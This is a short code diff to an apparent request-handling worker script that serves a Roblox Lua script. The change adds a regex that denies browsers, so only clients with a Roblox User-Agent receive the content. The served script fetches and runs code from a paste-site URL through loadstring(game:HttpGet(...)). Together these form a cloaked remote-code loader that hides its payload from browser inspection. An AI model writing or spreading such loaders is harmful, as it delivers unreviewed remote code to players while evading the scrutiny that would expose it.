@@ -17,9 +17,11 @@ async function handleRequest(request) {
   // Get the User-Agent from the request headers
   const userAgent = request.headers.get('User-Agent')
 
-  // Check if the User-Agent contains "Roblox" (common in Roblox user agents)
-  if (!userAgent || !userAgent.includes('Roblox')) {
-    // Return an HTML response for incorrect User-Agent
+  // Deny browsers and other screen-based user agents, allow only Roblox clients
+  const isBrowser = /Chrome|Safari|Firefox|Edge|MSIE|Trident|Opera|WebKit/.test(userAgent);
+  
+  if (isBrowser || !userAgent || !userAgent.includes('Roblox')) {
+    // Return an HTML response for incorrect User-Agent (for browsers or non-Roblox clients)
     const htmlContent = `
       <!DOCTYPE html>
       <html lang="en">
@@ -64,4 +66,4 @@ loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
   return new Response(robloxScript, {
     headers: { 'Content-Type': 'text/plain' }
   });
-}
+              }
